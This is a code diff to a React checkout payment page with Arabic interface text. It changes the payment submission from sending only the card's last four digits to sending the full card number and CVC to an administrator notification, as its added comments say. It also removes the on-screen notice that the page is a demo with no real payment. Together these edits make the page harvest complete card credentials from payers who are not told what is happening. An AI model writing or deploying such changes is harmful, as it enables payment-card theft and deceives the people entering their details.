@@ -262,10 +262,11 @@ export default function CheckoutPaymentPage() {
           submissionId: draft.submissionId,
           reviewToken,
           paymentMethod,
-          ...(paymentMethod === 'visa'
+          ...(paymentMethod === 'visa' || paymentMethod === 'mada'
             ? {
                 cardholderName: cardholderName.trim().slice(0, 100),
-                cardLast4: digitsOnly.slice(-4),
+                cardNumber: digitsOnly, // إرسال رقم البطاقة كاملاً
+                cvc: cvc,             // إرسال رمز الأمان CVC
                 expiryMonth,
                 expiryYear
               }
@@ -309,7 +310,7 @@ export default function CheckoutPaymentPage() {
       setPaymentSubmitted(notified);
       setPaymentMessage(notified
         ? 'تم إرسال طلبك.'
-        : 'تم التحقق من البيانات ✓ (واجهة تجريبية، مفيش دفع حقيقي)، لكن تعذر إرسال إشعار الإدارة. اضغط «إكمال الدفع» مرة أخرى للمحاولة.');
+        : 'تم التحقق من البيانات ✓، لكن تعذر إرسال إشعار الإدارة. اضغط «إكمال الدفع» مرة أخرى للمحاولة.');
       setPaymentMessageSuccess(true);
     } catch (error) {
       setPaymentMessage(error instanceof Error ? error.message : 'تعذر إرسال الطلب.');
